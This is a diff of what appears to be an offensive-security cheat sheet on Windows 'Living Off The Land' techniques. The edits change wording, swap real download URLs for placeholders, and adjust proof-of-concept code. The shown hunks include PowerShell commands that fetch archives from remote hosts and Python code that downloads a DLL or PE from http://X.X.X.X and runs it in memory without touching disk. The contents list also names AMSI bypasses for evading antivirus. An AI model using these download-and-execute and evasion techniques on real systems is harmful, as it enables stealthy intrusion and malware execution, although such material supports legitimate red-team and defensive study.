@@ -18,13 +18,13 @@ II.  Basic examples of 'Living Off The Land' techniques using LOLBAS (i.e. Livin
      ➤ Mshta.exe
      ➤ etc.
 
-III. Basic examples of 'Living Off The Land' techniques using PowerShell (i.e. load & execute straight in-memory PE/DLL/scripts)
+III. Basic examples of 'Living Off The Land' techniques using PowerShell (i.e. download & execute straight in-memory PE/DLL/scripts)
      ➤ PowerShell scripts
      ➤ .Net Assemblies (PE and DLL)
 
-IV.  Basic examples of 'Living Off The Land' techniques using Python (i.e. load & execute straight in-memory PE/DLL/scripts)
+IV.  Basic examples of 'Living Off The Land' techniques using Python (i.e. download & execute straight in-memory PE/DLL/scripts)
      ➤ Python scripts
-     ➤ PE and DLL (unmanaged code) loding using the 'PythonMemoryModule'
+     ➤ PE and DLL (unmanaged code) loading using the 'PythonMemoryModule'
 
 V.   AMSI bypass techniques to be able to load and execute in-memory offensive tools (PowerShell scripts & C# assemblies) without being detected by Antivirus
      ➤ AMSI bypass technique 1 - Force the AMSI initialization to fail in the current PowerShell session 
@@ -902,7 +902,7 @@ Note: On Windows machines, to use Python you can install it or download a portab
   + https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip
 ➤ IronPython 3.4 interpreter installer:
   + https://github.com/IronLanguages/ironpython3/releases/tag/v3.4.1
-➤ ...
+➤ https://github.com/hakril/PythonForWindows
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------
 3.1. How to download and execute straight in-memory a Python script hosted remotely on a Web server
@@ -914,7 +914,6 @@ PS C:\Users\Administrator> wget -URI http://192.168.1.144:8080/IronPythonPortabl
 PS C:\Users\Administrator> tar -xf .\IronPythonPortable.zip
 
 PS C:\Users\Administrator\IronPython\net462> ipy.exe
-
 IronPython 3.4.2 (3.4.2.1000)
 [.NETFramework,Version=v4.6.2 on .NET Framework 4.8.4785.0 (64-bit)] on win32
 Type "help", "copyright", "credits" or "license" for more information.
@@ -934,11 +933,13 @@ exec(payload)
 In the following example a .dll is downloaded (not saved on disk), loaded in memory and started by calling the entrypoint using the 'PythonMemoryModule'.
 -> https://github.com/naksyn/PythonMemoryModule
 
-Example:
---------
-PS C:\temp> wget -uri hhttps://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python.zip
+Basic PoC/example
+-----------------
+PS C:\temp> wget -uri https://X.X.X.X/python.zip -OutFile C:\temp\python.zip
 PS C:\temp> tar -xf .\python.zip
+
 PS C:\temp> .\python.exe
+Python 3.10.4 (tags/v3.10.4:9d38120, Mar 23 2022, 23:13:41) [MSC v.1929 64 bit (AMD64)] on win32
 
 #Python3
 import urllib.request
@@ -948,7 +949,7 @@ request = urllib.request.Request('http://X.X.X.X/example.dll')
 result = urllib.request.urlopen(request)
 buf=result.read()
 dll = pythonmemorymodule.MemoryModule(data=buf, debug=True)
-startDll = dll.get_proc_addr('StartW')
+startDll = dll.get_proc_addr('example')
 assert startDll()
 #dll.free_library()
 
@@ -960,11 +961,13 @@ assert startDll()
 In the following example a PE file is downloaded (not saved on disk), loaded and executed in-memory.
 -> https://github.com/naksyn/PythonMemoryModule
 
-Example:
---------
-PS C:\temp> wget -uri hhttps://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python.zip
+Basic PoC/example
+-----------------
+PS C:\temp> wget -uri https://X.X.X.X/python.zip -OutFile C:\temp\python.zip
 PS C:\temp> tar -xf .\python.zip
+
 PS C:\temp> .\python.exe
+Python 3.10.4 (tags/v3.10.4:9d38120, Mar 23 2022, 23:13:41) [MSC v.1929 64 bit (AMD64)] on win32
 
 #Python3
 import urllib.request
